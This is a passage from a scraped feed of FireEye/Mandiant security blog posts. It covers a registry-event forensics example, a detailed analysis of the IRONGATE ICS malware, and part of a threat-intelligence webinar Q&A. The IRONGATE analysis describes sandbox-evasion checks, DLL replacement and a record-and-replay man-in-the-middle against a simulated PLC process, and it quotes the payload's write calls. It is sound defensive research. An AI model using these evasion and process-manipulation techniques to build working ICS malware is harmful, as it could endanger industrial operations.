class=\"code\">HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\LegitWindowsService</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>Value Name</p> </td> \n   <td width=\"492\" valign=\"top\"><p> <span class=\"code\">ImagePath</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>Value Type</p> </td> \n   <td width=\"492\" valign=\"top\"><p> <span class=\"code\">REG_EXPAND_SZ</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>Base64 Encoded<br /> Value</p> </td> \n   <td width=\"492\" valign=\"top\"><p> <span class=\"code\">QwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABsAG<br /> UAZwBpAHQAcwBlAHIAdgBpAGMAZQAuAGUAeABlAAAAAA==</span></p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>Text</p> </td> \n   <td width=\"492\" valign=\"top\"><p> <span class=\"code\">C:\\Windows\\Temp\\legitservice.exe</span></p> </td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Table 8: Example real-time registry key event</span></p> \n<p>For our solution's real-time registry events, we can map the event type to the operation performed using Table 9.</p> \n<table border=\"1\" cellspacing=\"0\" cellpadding=\"0\"> \n <tbody> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p> <b>Event Type Value</b></p> </td> \n   <td width=\"492\" valign=\"top\"><p> <b>Operation</b></p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>1</p> </td> \n   <td width=\"492\" valign=\"top\"><p>PreSetValueKey</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>2</p> </td> \n   <td width=\"492\" valign=\"top\"><p>PreDeleteValueKey</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>3</p> </td> \n   <td width=\"492\" valign=\"top\"><p>PostCreateKey, PostCreateKeyEx, PreCreateKeyEx</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>4</p> </td> \n   <td width=\"492\" valign=\"top\"><p>PreDeleteKey</p> </td> \n  </tr> \n  <tr> \n   <td width=\"132\" valign=\"top\"><p>5</p> </td> \n   <td width=\"492\" valign=\"top\"><p>PreRenameKey</p> </td> \n  </tr>\n </tbody>\n</table> \n<p> <span class=\"type-XS\">Table 9: FireEye Endpoint Security real-time registry key event types</span></p> \n<p>Based on this real-time registry key event, the malicious executable <span class=\"code\">C:\\Windows\\Temp\\legitservice.exe</span> created the Windows service <span class=\"code\">LegitWindowsService</span>. If we investigated the surrounding registry keys, we might identify even more information about this malicious service.</p> \n<h4>Conclusion</h4> \n<p>The availability of real-time events designed for forensic analysis can fill in gaps that traditional forensic artifacts cannot on their own. Mandiant has seen great value in using real-time events during active-attacker investigations. We have used real-time events to determine the functionality of attacker utilities that were no longer present on disk, to determine users and source network addresses used during malicious remote desktop activity when expected corresponding event logs were missing, and more.</p> \n<p>Check out our <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/products/endpoint-security.html\">FireEye Endpoint Security page</a> and <a href=\"https://www.fireeye.com/services/freeware/redline.html\">Redline</a> page for more information (as well as <a href=\"https://fireeye.market/apps/211364\">Redline on the FireEye Market</a>), and take a <a href=\"https://content.fireeye.com/product-demo/webpage-endpoint-security-portal\">FireEye Endpoint Security tour</a> today.</p>","descriptionType":"html","publishedDate":"Thu, 14 May 2020 15:00:00 +0000","feedId":1226,"bgimg":"","linkMd5":"174a50c1fc056ea561415973c208ca66","bgimgJsdelivr":"","metaImg":"","author":"Daniel Pany","publishedOrCreatedDate":1598278264221},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"IRONGATE ICS Malware: Nothing to See Here...Masking Malicious Activity\non SCADA Systems","link":"http://www.fireeye.com/blog/threat-research/2016/06/irongate_ics_malware.html","description":"<p>In the latter half of 2015, the FireEye Labs Advanced Reverse Engineering (FLARE) team identified several versions of an ICS-focused malware crafted to manipulate a specific industrial process running within a simulated Siemens control system environment. We named this family of malware IRONGATE.</p> \n<p>FLARE found the samples on VirusTotal while researching droppers compiled with PyInstaller — an approach used by numerous malicious actors. The IRONGATE samples stood out based on their references to SCADA and associated functionality. Two samples of the malware payload were uploaded by different sources in 2014, but none of the antivirus vendors featured on VirusTotal flagged them as malicious.</p> \n<p>Siemens Product Computer Emergency Readiness Team (ProductCERT) confirmed that IRONGATE is not viable against operational Siemens control systems and determined that IRONGATE does not exploit any vulnerabilities in Siemens products. We are unable to associate IRONGATE with any campaigns or threat actors. We acknowledge that IRONGATE could be a test case, proof of concept, or research activity for ICS attack techniques.</p> \n<p>Our analysis finds that IRONGATE invokes ICS attack concepts first seen in <a href=\"http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/stuxnet_0_5_the_missing_link.pdf\">Stuxnet</a>, but in a simulation environment. Because the body of <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/products/industrial-systems-and-critical-infrastructure-security.html\">industrial control systems (ICS)</a> and supervisory control and data acquisition (SCADA) malware is limited, we are sharing details with the broader community.</p> \n<h4>Malicious Concepts</h4> \n<p> <b>Deceptive Man-in-the-Middle</b></p> \n<p>IRONGATE's key feature is a man-in-the-middle (MitM) attack against process input-output (IO) and process operator software within industrial process simulation. The malware replaces a Dynamic Link Library (DLL) with a malicious DLL, which then acts as a broker between a PLC and the legitimate monitoring software. This malicious DLL records five seconds of 'normal' traffic from a PLC to the user interface and replays it, while sending different data back to the PLC. This could allow an attacker to alter a controlled process unbeknownst to process operators.</p> \n<p> <b>Sandbox Evasion</b></p> \n<p>IRONGATE's second notable feature involves sandbox evasion. Some droppers for the IRONGATE malware would not run if VMware or Cuckoo Sandbox environments were employed. The malware uses these techniques to avoid detection and resist analysis, and developing these anti-sandbox techniques indicates that the author wanted the code to resist casual analysis attempts. It also implies that IRONGATE’s purpose was malicious, as opposed to a tool written for other legitimate purposes.</p> \n<p> <b>Dropper Observables</b></p> \n<p>We first identified IRONGATE when investigating droppers compiled with PyInstaller — an approach used by numerous malicious actors. In addition, strings found in the dropper include the word “payload”, which is commonly associated with malware.</p> \n<h4>Unique Features for ICS Malware</h4> \n<p>While IRONGATE malware does not compare to Stuxnet in terms of complexity, ability to propagate, or geopolitical implications, IRONGATE leverages some of the same features and techniques Stuxtnet used to attack centrifuge rotor speeds at the Natanz uranium enrichment facility; it also demonstrates new features for ICS malware.</p> \n<ul> \n <li>Both pieces of malware look for a single, highly specific process.</li> \n <li>Both replace DLLs to achieve process manipulation.</li> \n <li>IRONGATE detects malware detonation/observation environments, whereas Stuxnet looked for the presence of antivirus software.</li> \n <li>IRONGATE actively records and plays back process data to hide manipulations, whereas Stuxnet did not attempt to hide its process manipulation, but suspended normal operation of the S7-315 so even if rotor speed had been displayed on the HMI, the data would have been <a href=\"http://www.langner.com/en/wp-content/uploads/2013/11/To-kill-a-centrifuge.pdf\">static</a>.</li> \n</ul> \n<h4>A Proof of Concept</h4> \n<p>IRONGATE’s characteristics lead us to conclude that it is a test, proof of concept, or research activity.</p> \n<ul> \n <li>The code is specifically crafted to look for a user-created DLL communicating with the Siemens PLCSIM environment. PLCSIM is used to test PLC program functionality prior to in-field deployment. The DLLs that IRONGATE seeks and replaces are not part of the Siemens standard product set, but communicate with the S7ProSim COM object. Malware authors test concepts using commercial simulation software.</li> \n <li>Code in the malicious software closely matched usage on a control engineering blog dealing with PLCSIM (https://alexsentcha.wordpress.com/using-s7-prosim-with-siemens-s7-plcsim/ and https://pcplcdemos.googlecode.com/hg/S7PROSIM/BioGas/S7%20v5.5/).</li> \n <li>While we have identified and analyzed several droppers for the IRONGATE malware, we have yet to identify the code’s infection vector.</li> \n <li>In addition, our analysis did not identify what triggers the MitM payload to install; the <span class=\"code\">scada.exe </span>binary that deploys the IRONGATE DLL payload appears to require manual execution.</li> \n <li>We have not identified any other instances of the ICS-specific IRONGATE components (<span class=\"code\">scada.exe</span> and <span class=\"code\">Step7ProSim.dll</span>), despite their having been compiled in September of 2014.</li> \n <li>Siemens ProductCERT has confirmed that the code would not work against a standard Siemens control system environment.</li> \n</ul> \n<h4>Implications for ICS Asset Owners</h4> \n<p>Even though process operators face no increased risk from the currently identified members of the IRONGATE malware family, IRONGATE provides valuable insight into adversary mindset.</p> \n<p>Network security monitoring, indicator of compromise (IoC) matching, and good practice guidance from vendors and other stakeholders represent important defensive techniques for ICS networks.</p> \n<p>To specifically counter IRONGATE’s process attack techniques, ICS asset owners may, over the longer term, implement solutions that:</p> \n<ul> \n <li>Require integrity checks and code signing for vendor and user generated code. Lacking cryptographic verification facilitates file replacement and MitM attacks against controlled industrial processes.</li> \n <li>Develop mechanisms for sanity checking IO data, such as independent sensing and backhaul, and comparison with expected process state information. Ignorance of expected process state facilitates an attacker’s ability to achieve physical consequence without alarming operators.</li> \n</ul> \n<h4>Technical Malware Analysis</h4> \n<h5>IRONGATE Dropper Family</h5> \n<p>FireEye has identified six IRONGATE droppers: <span class=\"code\">bla.exe, update.exe<sub>1</sub>, update_no_pipe.exe<sub>1,</sub> update_no_pipe.exe<sub>2</sub>, update_no_pipe.exe<sub>2</sub>,<sub> </sub>update.exe<sub>3</sub>.</span> All but one of these Python-based droppers first checks for execution in a VMware or Cuckoo Sandbox environment. If found, the malware exits.</p> \n<p>If not found, the IRONGATE dropper extracts a UPX-packed, publicly available utility (<a href=\"http://www.nirsoft.net/utils/netresview.html\">NirSoft NetResView version 1.27</a>) to <span class=\"code\">audiodg.exe</span> in the same directory as the dropper. The dropper then executes the utility using the command <span class=\"code\">audiodg.exe /scomma scxrt2.ini.</span> This command populates the file <span class=\"code\">scxrt2.ini</span> with a comma-separated list of network resources identified by the host system.</p> \n<p>The dropper iterates through each entry in <span class=\"code\">scxrt2.ini</span>, looking for paths named <span class=\"code\">move-to-operational</span> or <span class=\"code\">move-to-operational.lnk</span>. If a path is found, the dropper first extracts the Base64-encoded .NET executable <span class=\"code\">scada.exe </span>to the current directory and then moves the file to the path containing<span class=\"code\"> move-to-operational</span> or <span class=\"code\">move-to-operational.lnk.</span> The path <span class=\"code\">move-to-operational</span> is interesting as well, perhaps implying that IRONGATE was not seeking the actual running process, but rather a staging area for code promotion. The dropper does not execute the <span class=\"code\">scada.exe </span>payload after moving it.</p> \n<p> <b>Anti-Analysis Techniques</b></p> \n<p>Each IRONGATE dropper currently identified deploys the same .NET payload, <span class=\"code\">scada.exe.</span> All but one of the droppers incorporated anti-detection/analysis techniques to identify execution in VMware or the Cuckoo Sandbox. If such environments are detected, the dropper will not deploy the .NET executable (<span class=\"code\">scada.exe</span>) to the host.</p> \n<p>Four of the droppers (<span class=\"code\">update.exe<sub>1</sub>, update_no_pipe.exe<sub>1</sub>, update_no_pipe.exe<sub>2</sub>,</span> and <span class=\"code\">update.exe<sub>3</sub></span>) detect Cuckoo environments by scanning subdirectories of the <span class=\"code\" style=\"color: rgb(216,36,53);\">%SystemDrive%</span>. Directories with names greater than five, but fewer than ten characters are inspected for the subdirectories <span class=\"code\">drop, files, logs, memory,</span> and <span class=\"code\">shots.</span> If a matching directory is found, the dropper does not attempt to deploy the <span class=\"code\">scada.exe</span> payload.</p> \n<p>The <span class=\"code\">update.exe<sub>1</sub></span> and <span class=\"code\">update.exe<sub>3</sub></span> droppers contain code for an additional Cuckoo check using the SysInternals pipelist program, <span class=\"code\">install.exe</span>, but the code is disabled in each.</p> \n<p>The <span class=\"code\">update.exe<sub>2</sub></span> dropper includes a check for VMware instead of Cuckoo. The VMWare check looks for the registry key <span class=\"code\">HKLM\\SOFTWARE\\VMware, Inc.\\VMware Tools</span> and the files <span class=\"code\"> <span style=\"color: rgb(216,36,53);\">%WINDIR%</span>\\system32\\drivers\\vmmouse.sys</span> and <span class=\"code\"> <span style=\"color: rgb(216,36,53);\">%WINDIR%</span>\\system32\\drivers\\vmhgfs.sys</span>. If any of these are found, the dropper does not attempt to deploy the <span class=\"code\">scada.exe</span> payload.</p> \n<p>The dropper <span class=\"code\">bla.exe</span> does not include an environment check for either Cuckoo or VMware.</p> \n<p> <b>scada.exe Payload</b></p> \n<p>We surmise that<span class=\"code\"> scada.exe</span> is a user-created payload used for testing the malware. First, our analysis did not indicate what triggers <span class=\"code\">scada.exe </span>to run. Second, Siemens ProductCERT informed us that <span class=\"code\">scada.exe</span> is not a default file name associated with Siemens industrial control software.</p> \n<p>When <span class=\"code\">scada.exe</span> executes, it scans drives attached to the system for filenames ending in <span class=\"code\">Step7ProSim.dll</span>. According to the Siemens ProductCERT, <span class=\"code\">Step7ProSim.dll</span> is not part of the Siemens PLCSIM software. We were unable to determine whether this DLL was created specifically by the malware author, or if it was from another source, such as example code or a particular custom ICS implementation. We surmise this DLL simulates generation of IO values, which would normally be provided by an S7-based controller, since the functions it includes appear derived from the Siemens PLCSIM environment.</p> \n<p>If <span class=\"code\">scada.exe </span>finds a matching DLL file name, it kills all running processes with the name <span class=\"code\">biogas.exe</span>. The malware then moves <span class=\"code\">Step7ProSim.dll </span>to <span class=\"code\">Step7ConMgr.dll </span>and drops a malicious <span class=\"code\">Step7ProSim.dll</span> – the IRONGATE payload – to the same directory.</p> \n<p>The malicious <span class=\"code\">Step7ProSim.dll</span> acts as an API proxy between the original user-created <span class=\"code\">Step7ProSim.dll </span>(now named <span class=\"code\">Step7ConMgr.dll</span>) and the application <span class=\"code\">biogas.exe</span> that loads it. Five seconds after loading, the malicious <span class=\"code\">Step7ProSim.dll </span>records five seconds of calls to <span class=\"code\">ReadDataBlockValue</span>. All future calls to <span class=\"code\">ReadDataBlockValue </span>return the recorded data.</p> \n<p>Simultaneously, the malicious DLL discards all calls to <span class=\"code\">WriteDataBlockValue </span>and instead calls <span class=\"code\">WriteInputPoint(0x110, 0, 0x7763)</span> and <span class=\"code\">WriteInputPoint(0x114, 0, 0x7763)</span> every millisecond. All of these functions are named similarly to Siemens S7ProSim v5.4 COM interface. It appears that other calls to API functions are passed through the malicious DLL to the legitimate DLL with no other modification.</p> \n<p> <b>Biogas.exe</b></p> \n<p>As mentioned previously, IRONGATE seeks to manipulate code similar to that found on a blog dealing with simulating PLC communications using PLCSIM, including the use of an executable named <span class=\"code\">biogas.exe</span>.</p> \n<p>Examination of the executable from that blog’s demo code shows that the <span class=\"code\">WriteInputPoint </span>function calls with byte indices <span class=\"code\">0x110</span> and <span class=\"code\">0x114</span> set pressure and temperature values, respectively:</p> \n<p>IRONGATE:</p> \n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"code\"> WriteInputPoint(0x110, 0, 0x7763)<br /> WriteInputPoint(0x114, 0, 0x7763)</span></p> \n<p>&nbsp;Equivalent pseudo code from Biogas.exe:&nbsp;</p> \n<p> <span class=\"code\">&nbsp; &nbsp; &nbsp; &nbsp; S7ProSim.WriteInputPoint(0x110, 0, (short)this.Pressure.Value)<br /> &nbsp; &nbsp;&nbsp; S7ProSim.WriteInputPoint(0x114, 0, (short)this.Temperature.Value)</span></p> \n<p>We have been unable to determine the significance of the hardcoded value <span class=\"code\">0x7763</span>, which is passed in both instances of the write function.</p> \n<p>Because of the noted indications that IRONGATE is a proof of concept, we cannot conclude IRONGATE’s author intends to manipulate specific temperature or pressure values associated with the specific biogas.exe process, but find the similarities to this example code striking.</p> \n<h4>Artifacts and Indicators</h4> \n<h5>PyInstaller Artifacts</h5> \n<p>The IRONGATE droppers are Python scripts converted to executables using PyInstaller. The compiled droppers contain PyInstaller artifacts from the system the executables were created on. These artifacts may link other samples compiled on the same system. Five of the six file droppers (<span class=\"code\">bla.exe, update.exe<sub>1</sub>, update_no_pipe.exe<sub>1</sub>, update_no_pipe.exe<sub>2</sub> and update.exe<sub>3</sub></span>) all share the same PyInstaller artifacts listed in Table 1.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/IRONGATE%20ICS/table1irongate.jpg\" /> <span class=\"type-XS\">Table 1: Pyinstaller Artifacts</span></p> \n<p>The remaining dropper, <span class=\"code\">update.exe<sub>2</sub></span>, contains the artifacts listed in Table 2.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/IRONGATE%20ICS/table2irongate.jpg\" /></p> \n<p> <span class=\"type-XS\">Table 2: Pyinstaller Artifacts for update.exe<sub>2</sub></span></p> \n<h5>Unique Strings</h5> \n<p>Figure 1 and 2 list the unique strings discovered in the <span class=\"code\">scada.exe</span> and <span class=\"code\">Step7ProSim.dll binaries.</span></p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/IRONGATE%20ICS/fig1irongate.jpg\" /></p> \n<p> <span class=\"type-XS\">Figure 1: Scada.exe Unique Strings</span></p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/IRONGATE%20ICS/fig2irongate.jpg\" /></p> \n<p> <span class=\"type-XS\">Figure 2: Step7ProSim.dll Unique Strings</span></p> \n<h5>File Hashes</h5> \n<p>Table 3 contains the MD5 hashes, file and architecture type, and compile times for the malware analyzed in this report.</p> \n<p> <img src=\"https://www.fireeye.com/content/dam/fireeye-www/blog/images/IRONGATE%20ICS/table3irongate.jpg\" /> <span class=\"type-XS\">Table 3: File MD5 Hashes and Compile Times</span></p> \n<p>FireEye detects IRONGATE. A list of indicators can be found <a href=\"https://github.com/fireeye/iocs\">here</a>.</p> \n<p>Special thanks to the Siemens ProductCERT for providing support and context to this investigation.</p>","descriptionType":"html","publishedDate":"Thu, 02 Jun 2016 12:00:00 +0000","feedId":1226,"bgimg":"https://www.fireeye.com/content/dam/fireeye-www/blog/images/IRONGATE%20ICS/table1irongate.jpg","linkMd5":"7d0fa0863298f7f7957d012cb5756f76","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn28@2020_5/2020/08/24/14-11-06-396_d62359e4af5b4122.webp","destWidth":925,"destHeight":335,"sourceBytes":58935,"destBytes":34862,"author":"Josh Homan","articleImgCdnMap":{"https://www.fireeye.com/content/dam/fireeye-www/blog/images/IRONGATE%20ICS/table1irongate.jpg":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn28@2020_5/2020/08/24/14-11-06-396_d62359e4af5b4122.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/IRONGATE%20ICS/table2irongate.jpg":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn58@2020_4/2020/08/24/14-11-20-780_d4d831b85fe6c034.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/IRONGATE%20ICS/fig1irongate.jpg":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn61@2020_4/2020/08/24/14-11-20-735_f81052a82db6bbdb.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/IRONGATE%20ICS/fig2irongate.jpg":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn96@2020_4/2020/08/24/14-11-11-587_1ca9d09b19f8363c.webp","https://www.fireeye.com/content/dam/fireeye-www/blog/images/IRONGATE%20ICS/table3irongate.jpg":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn83@2020_2/2020/08/24/14-11-11-454_008786615ac0277f.webp"},"publishedOrCreatedDate":1598278264199},{"createdTime":"2020-08-24 22:11:04","updatedTime":"2020-08-24 22:11:04","title":"Q&amp;A Follow-up - Tools of Engagement: The Mechanics of Threat Intelligence","link":"http://www.fireeye.com/blog/threat-research/2013/04/qa-followup-tools-engagement-mechanics-threat-intelligence.html","description":"<div class=\"c00 c00v1\"> \n <p> <i>As a follow-up to our recently held Tools of Engagement - The Mechanics of Threat Intelligence: Analysis, Information Sharing and Associated Challenges webinar, questions answered by presenters Doug Wilson and Jen Weedon are listed below. To view the archived webinar, please <a target=\"_blank\" href=\"http://www.fireeye.com/content/fireeye-www/en_US/company/webinars.html\">click here</a>.</i></p> \n <p> <b>1. We received some questions asking about work being done by Mandiant and others on open source intelligence sharing. We've got some questions about STIX and TAXII in comparison to other frameworks.</b></p> \n <p>To succeed with sharing indicators internally or externally, you have to pick a standardized format. That can be anything, honestly, from a tab-delimited file to complicated XML. If you are looking at sharing outside your organization, there are a couple of different standards that are out there to look at.</p> \n <p> <a target=\"_blank\" href=\"http://www.openioc.org/\">OpenIOC </a>is what Mandiant uses for recording and transmitting threat indicators. DHS funds a project through <a target=\"_blank\" href=\"http://www.mitre.org/\">MITRE </a>called STIX, with a transport and exchange mechanism that is called TAXII. IETF also has the MILE working group, which has a protocol named IODEF, which uses RID as its transfer and exchange mechanism. These are all ways of packaging up threat information and shipping them off to other people or organizations. We've been looking at interacting with both groups, and trying to make sure that OpenIOC interacts with both sets of protocols where it can.</p> \n <p>A lot of people are still very uncomfortable with the idea of sharing openly, so a lot of the sharing that's happening out there is going to be happening in smaller, closed groups.</p> \n <p>The protocols that we have discussed are all open standards, whether somebody is sharing in a small group or somebody is sharing in a large group. Since they are all open and feely available, there's not any restrictions to using them for sharing, and ultimately, we're hoping that there are some corporations out there that are standing up sharing portals - there are also government entities that are doing this as well. We're hoping that ultimately, people will be able to pick the tools that work properly for their particular situation. But whatever standard (or standards) shakes out as being the one most people use, it will need to be something that's open and accessible.</p> \n <p>There were several questions about sharing groups. If you're not familiar with the idea of an ISAC, I looking them up online. ISAC stands for Information Sharing and Analysis Center. There's an ISAC Council website that lists a bunch of the ISACs (not endorsed by Mandiant, but for reference: <a target=\"_blank\" href=\"http://www.isaccouncil.org/memberisacs.html\">http://www.isaccouncil.org/memberisacs.html</a>). Some of the larger ISACs have their own events and conferences, <a target=\"_blank\" href=\"https://www.fsisac.com/\">FS-ISAC</a> is one that is engaged in adopting threat information sharing standards (such as STIX).</p> \n <p>There are also specific groups for the Defense Industrial Base, or DIB. Associated with the DoD Cybercrime Center (DC3) is the DoD-DIB Collaborative Information Sharing Environment (DCISE).</p> \n <p> <b>2. As an investment bank, how should we advise our clients concerning cyber security audit and compliance prior to making an acquisition?</b></p> \n <p>We have seen threat activity around or related to <a target=\"_blank\" href=\"https://www.mandiant.com/blog/mtrends-4-merger-acquisition-served-side-compromise/\">acquisitions and mergers</a>. Entities should be aware that advanced attackers are often quite aware of business decisions and movements in industries that they're targeting, so you should take this into account when determining how you want to allocate resources for risk management.</p> \n <p>We can't directly advise any specific course of action, and folks should consult their counsel or their risk management personnel on specific actions, but on numerous occasions we have been asked to do investigations that center around acquisitions and mergers. We often advise our clients to consider doing threat assessments as part of the due diligence process when they are thinking of acquiring other companies. In addition, we conduct regular analysis on risk factors for companies who may be targeted by advanced threat actors to identify which variables may place them at higher likelihood of being targeted, and why. These variables may include the industry they're in, their intellectual property, strategic partnerships, business strategy, and overseas operations.</p> \n <p> <b>3.</b> <b>What are the options - in other words, legal or technical - available to counterattack hackers from world nations who don't respect international laws?</b></p> \n <p>Mandiant does not endorse or support hacking back in any form. We suggest an in-depth incident response life cycle within your organization's network and host, and an ongoing cycle of <a target=\"_blank\" href=\"https://www.mandiant.com/blog/malware-compromise/\">detection, response and containment</a>. We also suggest reaching out to law enforcement or appropriate authorities responsible for national security</p> \n <p> <b>4. What are the most important items to gather and share with a threat team for vulnerability analyses?</b></p> \n <p>An accurate depiction of vulnerabilities in an enterprise can help inform risk management decisions. This should be a two-way communication. A team that deals with threats can prioritize responding to some threats above others if they know certain vulnerabilities or weaknesses exist within their environment, and then the threat team can talk with whoever does the vulnerability assessment if they think certain types of actors are more likely to exploit certain types of vulnerabilities, so those vulnerabilities have a higher priority for getting fixed.</p> \n <p> <b>5. What kind of training do you suggest for intelligence analysis, especially cyber threat intelligence analysis?</b></p> \n <p>One of the most important things a company can do, or anyone that does threat intel in an office can do is to get the technical folks and the sort of more traditional intel analysts in the room together to observe sort of how the other side works.</p> \n <p>It may not be possible to fully cross-train both types of personnel on each other's disciplines, but the more interaction they have and the more folks get out of their comfort zones with what they're used to doing, the better your teams will understand with each other. Communication is key, especially when dealing with technical and non-technical teams having to work together.</p> \n <p> <b>6. Strategic versus tactical - why would individual firms care beyond what protects them from immediate threats? In other words, why would they care about strategic over the tactical?</b></p> \n <p>This gets into debates about attribution, categorization of threats and threat tracking, and what that matters, which is a large topic in and of itself. It really depends on where an organization is in terms of the maturity of its security capabilities.</p> \n <p>If an organization's security interests are strictly operational and are just looking at turning stuff away from the firewall and blocking things, the idea of this longer-term view of threat actors is not going to be interesting, because they are just looking at what can immediately stop the bleeding. As an organization becomes more mature in their security posture and starts to evolve it into basing security off of threat intelligence, they will be able to appreciate the use of strategic intelligence. But this requires an investment of a lot more resources, and investment in personnel and programs that are not normally considered standard for traditional \"information security\" yet.</p> \n <p> <b>7. Is threat intelligence a myth?</b></p> \n <p>Again, this depends a lot on the maturity level that a security program is at. It's not a myth, but it might be useless to entities that do not have the resources or focus to do anything with threat intelligence.</p> \n <p>We've seen that attribution is one area where people can go down a lot of rabbit holes. Some folks spend a lot of time arguing about the merit of attribution, and can get wrapped around the fact that attribution down to a specific human being is nearly impossible on the Internet. It doesn't necessarily matter who is at the keyboard unless you're a nation state or you're somebody who's going to be somehow doing an international lawsuit against a particular person.</p> \n <p>But the groups of actors, and what is motivating these groups to make them want to act against your enterprise, should be of interest to you. If you want to be proactive about securing your network and distributing resources to protect your network, it helps to know that someone is using a particular type of attack and they're not using another set of attacks. This may help you determine how to allocate resources for defense.</p> \n <p>If you have less resources, if you have a less mature security posture, if you're not as involved in terms of where you are in the life cycle of getting a sophisticated security program set up - and a lot of people are having a hard time getting down that road because you have the classic problems of justifying your budget, or <a target=\"_blank\" href=\"https://www.mandiant.com/blog/csuite-care-threat-intelligence/\">convincing your CEO that they care</a> - you're not necessarily going to care about a strategic view of threat actors.</p> \n <p>But if you're someone who's invested more in security, you have a larger investment in spending money on this and doing some sort of defense that is informed by a strategic viewpoint, it's going to matter a lot more, and we're seeing a lot more major companies turning in this direction, over time. So there could be naysayers, but the market is slowly speaking out against them.</p> \n <p> <b>8. What are some resources for analysts and detailed methodologies and curriculums as well as buying threat intelligence and reviews on different products and services?</b></p> \n <p>Without going into specifics on the latter question, there are certainly a lot of industry research organizations that have racked and stacked different threat intelligence providers and their solutions.</p> \n <p>I guess it really gets to what you can consume. Like Doug was saying, if you have the resources and the political will inside your organization to consume more strategic intelligence, you may have different needs and pursue different solutions providers.</p> \n <p>In terms of developing a threat intel capability, there are certainly lots of firms out there, including Mandiant, who consult on what you need to do to mature in that sense.</p> \n <p> <b>9.</b> <b>Is there public or closed IOC sharing platforms besides ioc.forensicartifacts.com?</b></p> \n <p>A couple of other entities out there are using OpenIOC publicly. If you are familiar with the company <a target=\"_blank\" href=\"http://www.alienvault.com/\">AlienVault</a>, their lab, when they do posts of threat information and blog posts about malware, will include an IOC as part of their sharing.</p> \n <p>We also do that with some of our blog posts and <a target=\"_blank\" href=\"https://forums.mandiant.com/\">forum </a>posts. Some of those are open and some of those closed to our customers, depending on the level of content. There, unfortunately, is not a wonderful public open sharing site for all of the IOCs out there other than <a target=\"_blank\" href=\"http://ioc.forensicartifacts.com\">http://ioc.forensicartifacts.com</a>.</p> \n <p>Most people are still kind of uncomfortable with the idea of sharing openly, so you're going to see closed communities springing up here and there and, over time, they're going to open up or improve or share with larger audiences. We hope to continue to contribute to that conversation as it evolves.</p> \n <p> <b>10. What are the sources of IOCs</b></p> \n <p>IOCs can come from a variety of sources. In Mandiant's case, they are a product of a wide variety of different sets of input throughout our business units, curated over time by our intel team. We capture IOCs from our investigative work, from feedback from our product and managed services customers, and from a wide variety of intel sources, including examining malware and network traffic. Organizations could create IOCs from their own knowledge of threats that they face, but usually they use a combination of their knowledge plus information gleaned from other security or intelligence sources.</p> \n <p> <b>11. What kind of IOC would you recommend sharing publicly or just in closed groups, so attackers don't know detection methods?</b></p> \n <p>IOCs don't necessarily give away detection methods. Specific pieces of intelligence may give away sources and methods, and you need to determine risk to your intel sources before sharing anything. However, in most cases, especially if you are already trying to combat an opponent that has launched attacks against your networks, they probably assume that you can capture anything that they may deploy against you. If you are using external sources of intelligence, the situation becomes more complex, which is where having trained intelligence staff and experienced analysts can help you make appropriate decisions. The risk tolerance of each organization is going to be different, so it will likely be something that you will have to tailor to your organization's limits.</p> \n <p> <b>12. What are some products that can be used for capturing/managing intelligence?</b></p> \n <p>We have previously discussed the use of threat intel in the form of IOCs. The freely available Mandiant IOC Editor can be used to write and edit IOCs, and Redline can consume IOCs for host based investigations. Both of these complement the commercial <a target=\"_blank\" href=\"https://www.mandiant.com/products/mandiant-platform/\">Mandiant for Intelligent Response®</a> offering.</p> \n <p> <b> <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/ioc-editor.html\">Mandiant IOC Editor</a></b></p> \n <p> <b> <a href=\"http://www.fireeye.com/content/fireeye-www/en_US/services/freeware/redline.html\">Redline</a></b></p> \n <p>Additionally, during the webinar we were also asked about tools for gathering and cataloging more strategic intelligence. None of these are endorsed by Mandiant. However, some examples of tools to consider are:</p> \n <p> <b>Splunk</b> <a target=\"_blank\" href=\"http://www.splunk.com/\">http://www.splunk.com/</a></p> \n <p> <b>Palantir</b> <a target=\"_blank\" href=\"http://www.fireeye.com/blog/threat-research/2013/04/ http://www.palantir.com/what-we-do/ \"> http://www.palantir.com/what-we-do/</a></p> \n <p> <b>Lynxeon</b> <a target=\"_blank\" href=\"http://www.21ct.com/products/lynxeon/\">http://www.21ct.com/products/lynxeon/</a></p> \n <p> <b>13. Do domains and IPs alone attribute activity to an actor if the actor was seeing using a domain or an IP once?</b></p> \n <p>Attribution to actors is a complicated and time-consuming process. Actors' use of certain domains or IPs as part of their attack infrastructure is only part of the story. Threat groups also frequently share infrastructure, malware, or other tools. There's certainly no 1:1 correspondence between IPs and domains and specific actors, especially if you've only observed the correlation once. They're 